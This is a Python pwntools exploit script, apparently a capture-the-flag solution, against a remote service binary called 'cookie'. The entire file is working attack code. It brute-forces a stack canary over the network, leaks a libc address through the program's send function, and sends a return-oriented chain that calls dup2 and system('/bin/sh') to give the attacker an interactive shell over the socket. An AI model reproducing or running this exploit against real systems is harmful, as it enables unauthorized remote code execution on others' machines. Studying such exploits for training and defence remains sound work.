# -*- coding: utf-8 -*-

from pwn import *

pwnable_filename = "./cookie"
# libc_filename = "/lib/i386-linux-gnu/libc.so.6"
libc_filename = "./libc.so.6"


def generate_io():
    # Io = remote("127.0.0.1", 10006)
    Io = remote("192.168.210.11", 10006)
    # Io = process(pwnable_filename)
    return Io

# gdb.attach(proc.pidof(Io)[0], gdbscript='b system\nc')


pwnable = ELF(pwnable_filename)
libc = ELF(libc_filename)


send_plt = pwnable.plt['send']
return_addr = 0x08048880
# 0x08048fba : pop edi ; pop ebp ; ret
pop_pop_ret_addr = 0x08048fba
send_got = pwnable.got['send']

libc_send_offset = libc.symbols['send']
libc_system_offset = libc.symbols['system']
libc_dup2_offset = libc.symbols['dup2']
libc_bin_sh_offset = next(libc.search("/bin/sh\x00"))

junk_size = 0x40
junk = "A" * junk_size


def crack_cannary(cannary):
    if len(cannary) == 4:
        return cannary
    else:
        context.log_level = 'error'
        for i in range(4 - len(cannary)):
            for j in range(0x100):
                if j == 10:
                    continue
                Io = generate_io()
                Io.read()
                payload = flat([
                    junk,
                    cannary + chr(j),
                ])
                print "[+] Payload: %r" % (payload)
                Io.sendline(payload)
                try:
                    data = Io.read()
                    print data
                    if "GoodBye!" in data:
                        print("Found!")
                        break
                except Exception:
                    pass
                Io.close()
            cannary += chr(j)
        context.log_level = 'info'
        return cannary


def leak(Io, cannary, address):
    # Clear buffer
    Io.read()
    word_length = 4
    fd = 4
    flags = 0
    # Leak send got
    payload = flat([
        junk,
        cannary,
        "A" * 4 * 3,
        p32(send_plt),
        p32(return_addr),
        p32(fd),
        p32(address),
        p32(word_length),
        p32(flags),
    ])
    print "[+] Payload: %r" % (payload)
    Io.sendline(payload)
    # gdb.attach(Io)
    data = u32(Io.read(4))
    return data


def main():
    ########################
    # Step 1. Crack canary #
    ########################

    cannary = "\x00\xff\x8d\xb2"
    cannary = crack_cannary(cannary)
    print "[+] Cannary: 0x%s" % (cannary.encode("hex"))
    Io = generate_io()

    ################
    # Step 2. Leak #
    ################

    # send_addr = leak(Io, cannary, send_got)
    # print "[+] send_addr: 0x%08x" % (send_addr)

    # # send_offset - system_offset = remote_send_addr - remote_system_addr
    # # remote_system_addr = remote_send_addr - send_offset + system_offset
    # system_addr = send_addr - libc_send_offset + libc_system_offset
    # print "[+] system_addr: 0x%08x" % (system_addr)

    # dup2_addr = send_addr - libc_send_offset + libc_dup2_offset
    # print "[+] dup2_addr: 0x%08x" % (dup2_addr)

    # bin_sh_addr = send_addr - libc_send_offset + libc_bin_sh_offset
    # print "[+] bin_sh_addr: 0x%08x" % (bin_sh_addr)

    #####################
    # Step 3. Get shell #
    #####################

    '''
    [+] send_addr: 0xf76263a0
    [+] system_addr: 0xf7578da0
    [+] dup2_addr: 0xf7614310
    [+] bin_sh_addr: 0xf7699a0b
    '''

    system_addr = 0xf7578da0
    dup2_addr = 0xf7614310
    bin_sh_addr = 0xf7699a0b

    stdin = 0
    stdout = 1
    socket_fd = 4

    payload = flat([
        junk,
        cannary,
        "A" * 4 * 3,
        # dup2(socket_fd, stdin)
        p32(dup2_addr),
        p32(pop_pop_ret_addr),
        p32(socket_fd),
        p32(stdin),
        # dup2(socket_fd, stdout)
        p32(dup2_addr),
        p32(pop_pop_ret_addr),
        p32(socket_fd),
        p32(stdout),
        # system("/bin/sh")
        p32(system_addr),
        p32(0xFFFFFFFF),
        p32(bin_sh_addr),
    ])

    Io.sendline(payload)

    Io.interactive()


if __name__ == '__main__':
    main()
